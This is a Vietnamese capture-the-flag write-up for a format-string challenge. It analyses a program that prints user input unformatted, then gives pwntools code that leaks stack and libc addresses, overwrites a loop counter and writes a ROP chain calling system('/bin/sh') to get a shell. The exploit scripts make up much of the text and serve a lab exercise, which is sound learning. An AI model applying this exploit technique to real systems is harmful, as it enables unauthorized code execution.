# format string + ROPchain

kiểm tra các chế dộ bảo vệ cơ bản của chương trình :

![image](https://user-images.githubusercontent.com/93699926/234209816-cf1db707-3299-4edb-85ec-c3d671b56063.png)

cùng mở IDA để xem luồng thực thi của chương trình :

![image](https://user-images.githubusercontent.com/93699926/234210146-491ca0be-f894-49d5-baa9-02d660fd41b5.png)
 
 Luồng thực thi của chương trình đơn giản như sau 
 
 +) đầu tiên nó gọi hàm Localtime và gieo seed trùng với thời gian chương trình chạy để lấy giờ và in ra những message . đoạn này không đáng quan tâm tại nó chỉ là tính năng của chương trình và không có lỗi 
 
 +) tiếp dó nó cho ta nhập 14 ksy tự vô format được khai báo tới tận 40bytes trước đó =>> no BOF
 
 +) và sau đó nó lại in biến format ra cho ta mà không có bất kỳ format specifier nào =>> fmt vuln
 
 
 # Ý tưởng khai thác
 ta sẽ sử dụng lỗi fmt này để tạo ROPchain tại địa chỉ trả về của hàm main . nhưng vấn đề là ta chỉ có thể sử dụng lỗi format string này 3 lần quá ít và không thể làm gì được .
 vậy nếu ta thay đổi gia trị của của biến i thành một giá tị âm vô cùng nào đó thì ta sẽ có thể sử dụng fmt một cách thoải mái :
 ta hãy cùng kiểm tra chương trình qua GDB, đặt lệnh b* <ngay ở địa chỉ của hàm printf khi nó in ra format của mình vừa nhập > và kiểm tra stack:
 
![image](https://user-images.githubusercontent.com/93699926/234217426-24404091-1bfa-4fce-b4b6-114e7d064184.png)

để ý địa chỉ được đặt trong ô vuông đỏ , đó chính là địa chỉ của i (ngay tại địa chỉ rsp+8) và vì biến i được khai báo là int i nên nó chỉ có 4 byte,vậy nếu ta muốn thay đổi giá trị của i thành số âm thì ta chỉ cần thay đổi byte lớn nhất cảu i thành 0xff là được
 VD: i = 0x00000001 =>> 0xff000001= -16777215
 
 vậy làm vậy bằng cách nào : để ý tại địa chỉ 0x007ffc5902ab08 và 0x007ffc5902ab20 ta có một giá trị stack đang trỏ tơi một giá trị stack khác
 Vậy ta sẽ sử dụng địa chỉ 0x007ffc5902ab20 với %28 để có thể ghi đè giá trị mà nó tỏ tới thành giá trị của rsp+8 và ta sẽ sử dụng chính địa chỉ 0x007ffc5902abf8 với %55 lúc đó dang chứa địa chỉ rsp+8 và thay đổi giá trị của i thành giá trị mà ta mong muốn
 (chú ý: 0x007ffc5902ab20 là giá trị trên stack tại %28 đang trỏ tới một giá tị stack khác và còn 0x007ffc5902abf8 tương ứng với %55 lúc sau là địa chỉ thât trên stack đang chứa địa chỉ của rsp+8 đẫ được ta chỉnh sửa )
 các bạn cũng có thể sử dụng 0x007ffc5902ab08 vơi %25 tương ứng nhưng khi tạo ROPchain hãy dùng %28 đề còn có chỗ mà tạo ROPchain 
 
 ```python
 '''
leak stack-> tinh duoc stack base (tại lần chạy đó)-> tinh duoc dia chi cua i (stack base=leak -0x1e748)
viet i len stack vaf thay doi no (i=stackbase +0x1e5c8)
'''
###### stage 1: leak stack###############
payload=b'%25$p'
p.sendlineafter(b'Professional): ',payload)
p.recvuntil(b" You: ")
leak=int(p.recv(14),16)
stack=leak-0x1e748
i_address=stack+0x1e5c8
saved_rip=i_address+0x70
log.info('[+]leak:'+hex(leak))
log.info('[+]stack:'+hex(stack))
log.info('[+]i addess:'+hex(i_address))
log.info('[+]saved rip:'+hex(saved_rip))

###### stage2 : over write i address#####
payload=f'%{(i_address&0xffff)+2}c%25$hn'.encode()
p.sendafter(b'Professional): ',payload)
payload=f'%{0xffff}c%55$hn'.encode()
p.sendlineafter(b'Professional): ',payload)
 ```
 
 vì stack sẽ thay đổi sau mỗi lần chạy các giá trị địa chỉ stack cũng vậy , nhưng vì offset không thay đổi nên sau khi ta leak được một giá trị stack thì ta có thể tính được các địa chỉ khác mà ta cần(trừ địa chỉ stack base vì lý do gì đó nhưng cứ tính stack base ở lần chạy trên máy rồi dúng stack base đó tính các giá trị khác thì vẫn đúng)
 
 kiểm tra stack ta thấy như sau :
 
 ![image](https://user-images.githubusercontent.com/93699926/234217987-4a3e8834-baa9-4d42-82bc-923b96e37589.png)
 
  ta đã thành công thay đổi giá trị của i thành 0xffff0003=-65533 với giá trị này thì có mà tạo được 10 cái ROPchain .ok moving on
  
  để tạo ROPchain thì ta sẽ cần kiếm các gadget phù hợp để ta sẽ lấy nó ra từ chính file libc (lưu ý là bài này sử dụng file libc.so.6) có sẵn trên máy , mình chạy thử lần đầu trên sever may mắn được luôn nên không phải đi kiếm libc nữa 
  
  Để mà sử dụng các gadget của file libc thì ta cần leak được địac hcỉ libc và sau đó tính base của nó , dùng ropper --f libc.6.so để kiếm offset của các gadget cần tìm (rồi cộng với libc base thì sẽ có thể sử dụng gadget đó ).ok script như sau :
  ```python
  ########stage3 leak libc###
payload=b'%21$p'
p.sendlineafter(b'Professional): ',payload)
p.recvuntil(b" You: ",drop=True)
p.recvuntil(b" You: ")
leak2=int(p.recv(14),16)
libc.address=leak2-0x29d90
log.info('[+]leak2:'+hex(leak2))
log.info('[+]libc base:'+hex(libc.address))
log.info('[+]/bin/sh:'+hex(next(libc.search(b'/bin/sh'))))
log.info('[+]system:'+hex(libc.sym['system']))
pop_rdi=libc.address+0x000000000002a3e5
pop_rsi=libc.address+0x000000000002be51
bin_sh=next(libc.search(b'/bin/sh'))
ret=libc.address+0x0000000000029cd6
  ```
 tiếp theo là ghi các gadget lần lượt bắt đầu từ saved rip của của main đến các địa chỉ trên stack kế sau nó và set lại giá trị i thành 2 để chương trình return và ta sẽ có shell 
 
 Mình có viết mọt function để thuận tiệp cho việc tạo ROPchain như sau :
 ```python
 log.info('[+]ROPPING')
def ROP(address,gadget):
    payload=f'%{(address&0xffff)}c%28$hn'.encode()
    p.sendafter(b'Professional): ',payload)
    payload=f'%{gadget&0xffff}c%55$hn'.encode()
    p.sendlineafter(b'Professional): ',payload)

    byte=int('0x'+str(hex(gadget))[6:10],16)
    payload=f'%{(address&0xffff)+2}c%28$hn'.encode()
    p.sendafter(b'Professional): ',payload)
    payload=f'%{(byte)&0xffff}c%55$hn'.encode()
    p.sendlineafter(b'Professional): ',payload)

    byte=int(str(hex(gadget))[0:6],16)
    payload=f'%{(address&0xffff)+4}c%28$hn'.encode()
    p.sendafter(b'Professional): ',payload)
    payload=f'%{(byte)&0xffff}c%55$hn'.encode()
    p.sendlineafter(b'Professional): ',payload)
 ``` 

hmm nó cũng giống như lúc ghi giá trị của i thành 0xff000003 thôi nhé 
đã có func để tạo ROP rồi thì tạo rop thui 
```python
ROP(saved_rip,pop_rsi)
ROP(saved_rip+16,pop_rdi)
ROP(saved_rip+24,bin_sh)
ROP(saved_rip+32,ret)
ROP(saved_rip+40,libc.sym['system'])


#######return##############
payload=f'%{(i_address&0xffff)+2}c%28$hn'.encode()
p.sendafter(b'Professional): ',payload)
payload=f'%{0x2}c%55$n'.encode()
p.sendlineafter(b'Professional): ',payload)
## get shell
p.interactive() 
```
full script in p.py
chạy chương trình trên sever ta có shell và flag :

![image](https://user-images.githubusercontent.com/93699926/234221422-896355a8-d0e2-42e4-a524-8577e54095c3.png)



